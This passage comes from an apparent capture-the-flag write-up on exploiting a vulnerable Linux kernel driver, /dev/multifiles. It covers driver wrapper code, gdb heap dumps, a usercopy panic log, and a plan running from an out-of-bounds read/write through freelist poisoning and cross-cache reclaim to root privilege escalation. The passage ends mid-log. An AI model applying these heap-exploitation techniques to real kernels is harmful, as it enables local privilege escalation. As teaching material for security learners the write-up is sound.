+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#61afef;font-weight:bold">file_pos_write</span>(<span style="color:#e06c75">file</span>, <span style="color:#e06c75">pos</span>);            <span style="color:#7f848e">// write the (advanced) position back
+</span></span></span></code></pre></div><p>So the <code>loff_t *offset</code> argument handed to the driver is a pointer to a copy of <code>file-&gt;f_pos</code>, and after the op the kernel writes it back (which is why a normal <code>read</code> advances the position). <code>multifiles_llseek</code> sets <code>file-&gt;f_pos</code> directly. Net effect: <code>lseek()</code> followed by <code>read()</code>/<code>write()</code> lets us pick exactly where the driver&rsquo;s copy starts — including the OOB window <code>[0x80, 0x9f]</code>.</p>
+<blockquote>
+<p><strong>Further reading — VFS <code>f_pos</code> / <code>llseek</code>:</strong></p>
+<ul>
+<li><a href="https://www.kernel.org/doc/html/latest/filesystems/vfs.html">Linux kernel docs — VFS, <code>struct file_operations</code></a> (the <code>llseek</code>/<code>read</code>/<code>write</code> contracts)</li>
+<li><a href="https://man7.org/linux/man-pages/man2/lseek.2.html"><code>lseek(2)</code> man page</a> (userspace semantics, <code>SEEK_SET</code>)</li>
+<li><a href="https://elixir.bootlin.com/linux/latest/source/fs/read_write.c"><code>fs/read_write.c</code> on Bootlin Elixir</a> — read <code>ksys_read</code>, <code>file_pos_read</code>/<code>file_pos_write</code>, <code>vfs_read</code>, <code>generic_file_llseek</code> to see how <code>f_pos</code> flows into <code>*offset</code></li>
+</ul>
+</blockquote>
+<h2 id="primitives">Primitives</h2>
+<p><strong>Controlled OOB read/write:</strong>
+By setting <code>f_pos</code> via <code>llseek</code> to a value in <code>[0x80, 0x9f]</code>, <code>read()</code>/<code>write()</code> will copy from/to <code>obj+0x20+offset</code>, which lands in the next adjacent slab object. Up to 64 bytes (<code>MAX_RW_SIZE</code>) per operation, 8-byte aligned (<code>count % sizeof(u64) == 0</code>).</p>
+<p><strong>Arbitrary position within object:</strong>
+<code>llseek</code> allows resetting <code>f_pos</code> to any value in <code>[0, 0x9f]</code>, giving full control over where within the object (or OOB window) the next read/write lands.</p>
+<p><strong>Multiple independent file descriptors:</strong>
+Each <code>open()</code> on <code>/dev/multifiles</code> gets its own <code>MultiFileList</code> with its own 67 slots and its own <code>f_pos</code>. Objects in one fd&rsquo;s list can be adjacent in the slab to objects from another fd&rsquo;s list, enabling cross-fd OOB access.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Before diving in, here&rsquo;s the whole plan:</p>
+<ol>
+<li><strong>Validate the OOB.</strong> Confirm a slot can read its neighbor through the base-vs-bounds mismatch.</li>
+<li><strong>Leak the heap.</strong> Decode <code>page_base</code> and <code>cache_random</code> from encoded freelist words on a full slab page.</li>
+<li><strong>Forge a freelist pointer.</strong> With the secret known, poison a freed object&rsquo;s <code>next</code> to a chosen address.</li>
+<li><strong>Find contiguous pages.</strong> Locate two physically adjacent slab pages <code>A</code>, <code>B == A+0x1000</code>.</li>
+<li><strong>Build a page-end fake object.</strong> Poison <code>A</code>&rsquo;s tail so a fresh object lands at <code>A+0xfc0</code> and straddles into <code>B</code>.</li>
+<li><strong>Cross-cache reclaim.</strong> Drain <code>B</code> back to the buddy allocator and let a <code>struct file</code> for <code>/bin/drop_priv</code> take its place.</li>
+<li><strong>Patch and respawn.</strong> Flip the file&rsquo;s <code>f_mode</code> write bits through the straddle, <code>pwrite</code> the binary, and let init rerun it as root.</li>
+</ol>
+<h3 id="primitive-validation">Primitive validation</h3>
+<p>The exploit is built on a thin layer of wrappers over the driver ABI:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#e5c07b">int</span>  <span style="color:#61afef;font-weight:bold">mf_open</span>(<span style="color:#e5c07b">void</span>);                          <span style="color:#7f848e">// open(&#34;/dev/multifiles&#34;, O_RDWR)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#e5c07b">int</span>  <span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">fd</span>, <span style="color:#c678dd">const</span> <span style="color:#e5c07b">char</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">name</span>);    <span style="color:#7f848e">// ioctl(CREATE) -&gt; slot index
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">mf_set_active</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">fd</span>, <span style="color:#e5c07b">uint32_t</span> <span style="color:#e06c75">idx</span>);    <span style="color:#7f848e">// ioctl(SET_ACTIVE)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span><span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">mf_delete</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">fd</span>, <span style="color:#e5c07b">uint32_t</span> <span style="color:#e06c75">idx</span>);        <span style="color:#7f848e">// ioctl(DELETE)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">5</span><span><span style="color:#7f848e">// select idx, lseek(fpos, SEEK_SET), then read len bytes (len % 8 == 0, &lt;= 64)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">6</span><span><span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">mf_read</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">fd</span>, <span style="color:#e5c07b">uint32_t</span> <span style="color:#e06c75">idx</span>, <span style="color:#e5c07b">off_t</span> <span style="color:#e06c75">fpos</span>, <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">buf</span>, <span style="color:#e5c07b">size_t</span> <span style="color:#e06c75">len</span>);
+</span></span></code></pre></div><p>Note <code>mf_read</code> folds <code>set_active</code> + <code>lseek</code> + <code>read</code> into one call, so <code>fpos</code>
+is exactly the <code>f_pos</code> the driver will use as its copy offset.</p>
+<p>For now let&rsquo;s work within a single file descriptor and validate the OOB primitive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">void</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>    <span style="color:#e5c07b">int</span> <span style="color:#e06c75">fd</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">mf_open</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span>    <span style="color:#e5c07b">int</span> <span style="color:#e06c75">a0</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e06c75">fd</span>, <span style="color:#98c379">&#34;a0&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>    <span style="color:#e5c07b">int</span> <span style="color:#e06c75">a1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e06c75">fd</span>, <span style="color:#98c379">&#34;a1&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>    <span style="color:#e5c07b">int</span> <span style="color:#e06c75">a2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">mf_create</span>(<span style="color:#e06c75">fd</span>, <span style="color:#98c379">&#34;a2&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>    <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;[*] created slots: a0=%d a1=%d a2=%d</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>, <span style="color:#e06c75">a0</span>, <span style="color:#e06c75">a1</span>, <span style="color:#e06c75">a2</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span>    <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;[*] press enter to set_active(%d)...</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>, <span style="color:#e06c75">a0</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>    <span style="color:#61afef;font-weight:bold">getchar</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>    <span style="color:#61afef;font-weight:bold">mf_set_active</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">a0</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span>    <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;[*] active = %d</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>, <span style="color:#e06c75">a0</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span>    <span style="color:#c678dd">return</span> <span style="color:#d19a66">0</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span>}
+</span></span></code></pre></div><p><code>multifiles_set_active</code> is <code>static</code> and gets inlined into <code>multifiles_ioctl</code>, so there is no standalone symbol to break on. Set a breakpoint at <code>multifiles_ioctl</code> (<code>.text+0x2f0</code>) and step into the <code>SET_ACTIVE</code> branch from the switch.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span>gef&gt; x/16gx <span style="color:#e06c75">$r12</span>+0x20
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>0xffff8880038d7020:     0xffff888003989000      0xffff8880039890a0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span>0xffff8880038d7030:     0xffff888003989140      0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>0xffff8880038d7040:     0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>0xffff8880038d7050:     0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>0xffff8880038d7060:     0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>0xffff8880038d7070:     0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span>0xffff8880038d7080:     0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>0xffff8880038d7090:     0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>gef&gt; telescope *<span style="color:#56b6c2">(</span>void**<span style="color:#56b6c2">)(</span><span style="color:#e06c75">$r12</span>+0x20<span style="color:#56b6c2">)</span> -n
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>      0xffff888003989000|+0x0000|+000: 0x0000000000000001
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span>      0xffff888003989008|+0x0008|+001: 0x7d333a7b66746362 <span style="color:#98c379">&#39;bctf{:3}a0&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span>      0xffff888003989010|+0x0010|+002: 0x0000000000003061 <span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;a0&#39;</span>?<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span>      0xffff888003989018|+0x0018|+003: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span>      0xffff888003989020|+0x0020|+004: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">16</span><span>      0xffff888003989028|+0x0028|+005: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">17</span><span>      0xffff888003989030|+0x0030|+006: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">18</span><span>      0xffff888003989038|+0x0038|+007: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">19</span><span>      0xffff888003989040|+0x0040|+008: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">20</span><span>      0xffff888003989048|+0x0048|+009: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">21</span><span>      0xffff888003989050|+0x0050|+010: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">22</span><span>      0xffff888003989058|+0x0058|+011: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">23</span><span>      0xffff888003989060|+0x0060|+012: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">24</span><span>      0xffff888003989068|+0x0068|+013: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">25</span><span>      0xffff888003989070|+0x0070|+014: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">26</span><span>      0xffff888003989078|+0x0078|+015: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">27</span><span>      0xffff888003989080|+0x0080|+016: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">28</span><span>      0xffff888003989088|+0x0088|+017: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">29</span><span>      0xffff888003989090|+0x0090|+018: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">30</span><span>      0xffff888003989098|+0x0098|+019: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">31</span><span>      0xffff8880039890a0|+0x00a0|+020: 0x0000000000000001
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">32</span><span>      0xffff8880039890a8|+0x00a8|+021: 0x7d333a7b66746362 <span style="color:#98c379">&#39;bctf{:3}a1&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">33</span><span>      0xffff8880039890b0|+0x00b0|+022: 0x0000000000003161 <span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;a1&#39;</span>?<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">34</span><span>      0xffff8880039890b8|+0x00b8|+023: 0x0000000000000000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">35</span><span>      ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">36</span><span>      0xffff888003989140|+0x0140|+040: 0x0000000000000001
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">37</span><span>      0xffff888003989148|+0x0148|+041: 0x7d333a7b66746362 <span style="color:#98c379">&#39;bctf{:3}a2&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">38</span><span>      0xffff888003989150|+0x0150|+042: 0x0000000000003261 <span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;a2&#39;</span>?<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">39</span><span>      ...
+</span></span></code></pre></div><h3 id="leaking-the-flag--and-the-hardened-usercopy-wall">Leaking the flag — and the hardened usercopy wall</h3>
+<p>The obvious first target is that <code>bctf{:3}</code> canary in <code>flags</code>. A freshly created neighbor has <code>flags</code> at offset <code>0x08</code>, so let&rsquo;s point the OOB read at the neighbor&rsquo;s header: <code>f_pos=0x80</code> makes the copy start at <code>obj+0xa0</code> = the neighbor&rsquo;s offset <code>0</code>, which would put its <code>flags</code> in <code>leak[1]</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#e5c07b">uint8_t</span> <span style="color:#e06c75">leak</span>[<span style="color:#d19a66">0x40</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#61afef;font-weight:bold">mf_read</span>(<span style="color:#e06c75">fd</span>, <span style="color:#e06c75">a0</span>, <span style="color:#d19a66">0x80</span>, <span style="color:#e06c75">leak</span>, <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">leak</span>)); <span style="color:#7f848e">// copy base obj+0xa0 = neighbor+0x00
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#7f848e">// neighbor flags would land at leak+0x08
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span><span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;[*] neighbor flags = 0x%llx</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>, <span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span> <span style="color:#e5c07b">long</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">leak</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>));
+</span></span></code></pre></div><p>Running it instantly panics:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#56b6c2">[</span>   12.567074<span style="color:#56b6c2">]</span> usercopy: Kernel memory exposure attempt detected from SLUB object <span style="color:#98c379">&#39;multifiles_cache&#39;</span> <span style="color:#56b6c2">(</span>offset 0, size 64<span style="color:#56b6c2">)</span>!
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span><span style="color:#56b6c2">[</span>   12.568138<span style="color:#56b6c2">]</span> ------------<span style="color:#56b6c2">[</span> cut here <span style="color:#56b6c2">]</span>------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span><span style="color:#56b6c2">[</span>   12.568300<span style="color:#56b6c2">]</span> kernel BUG at mm/usercopy.c:102!
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span><span style="color:#56b6c2">[</span>   12.569592<span style="color:#56b6c2">]</span> Oops: invalid opcode: <span style="color:#d19a66">0000</span> <span style="color:#56b6c2">[</span><span style="color:#7f848e">#1] PREEMPT SMP PTI</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span><span style="color:#56b6c2">[</span>   12.570619<span style="color:#56b6c2">]</span> CPU: <span style="color:#d19a66">0</span> UID: <span style="color:#d19a66">1000</span> PID: <span style="color:#d19a66">54</span> Comm: w Tainted: G           O       6.12.81-dirty <span style="color:#7f848e">#1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span><span style="color:#56b6c2">[</span>   12.571082<span style="color:#56b6c2">]</span> Tainted: <span style="color:#56b6c2">[</span>O<span style="color:#56b6c2">]=</span>OOT_MODULE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span><span style="color:#56b6c2">[</span>   12.571198<span style="color:#56b6c2">]</span> Hardware name: QEMU Standard PC <span style="color:#56b6c2">(</span>i440FX + PIIX, 1996<span style="color:#56b6c2">)</span>, BIOS 1.17.0-10.fc44 06/10/2025
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span><span style="color:#56b6c2">[</span>   12.571507<span style="color:#56b6c2">]</span> RIP: 0010:usercopy_abort+0x68/0x80
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span><span style="color:#56b6c2">[</span>   12.572341<span style="color:#56b6c2">]</span> Code: ac <span style="color:#d19a66">51</span> <span style="color:#d19a66">48</span> c7 c2 <span style="color:#d19a66">48</span> b3 <span style="color:#d19a66">97</span> ac <span style="color:#d19a66">41</span> <span style="color:#d19a66">52</span> <span style="color:#d19a66">48</span> c7 c7 <span style="color:#d19a66">58</span> 2d 9c ac <span style="color:#d19a66">48</span> 0f <span style="color:#d19a66">45</span> d6 <span style="color:#d19a66">48</span> c7 c6 <span style="color:#d19a66">45</span> <span style="color:#d19a66">09</span> <span style="color:#d19a66">96</span> ac <span style="color:#d19a66">48</span> <span style="color:#d19a66">89</span> c1 <span style="color:#d19a66">49</span> 0f <span style="color:#d19a66">45</span> f3 e8 f9 <span style="color:#d19a66">27</span> e9 ff <span style="color:#d19a66">90</span> &lt;0f&gt; 0b <span style="color:#d19a66">49</span> c7 c1 f8 f4 <span style="color:#d19a66">99</span> ac 4d <span style="color:#d19a66">89</span> ca 4d <span style="color:#d19a66">89</span> c8 eb a7 0f 1f <span style="color:#d19a66">80</span> <span style="color:#d19a66">00</span> <span style="color:#d19a66">00</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span><span style="color:#56b6c2">[</span>   12.572840<span style="color:#56b6c2">]</span> RSP: 0018:ffffb6d740173dd0 EFLAGS: <span style="color:#d19a66">00010246</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span><span style="color:#56b6c2">[</span>   12.573072<span style="color:#56b6c2">]</span> RAX: 000000000000006a RBX: ffffa01ac19ba0a0 RCX: 00000000ffffdfff
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span><span style="color:#56b6c2">[</span>   12.573194<span style="color:#56b6c2">]</span> RDX: <span style="color:#d19a66">0000000000000000</span> RSI: ffffb6d740173c88 RDI: <span style="color:#d19a66">0000000000000001</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span><span style="color:#56b6c2">[</span>   12.573337<span style="color:#56b6c2">]</span> RBP: <span style="color:#d19a66">0000000000000040</span> R08: 0000000000009ffb R09: 00000000ffffdfff
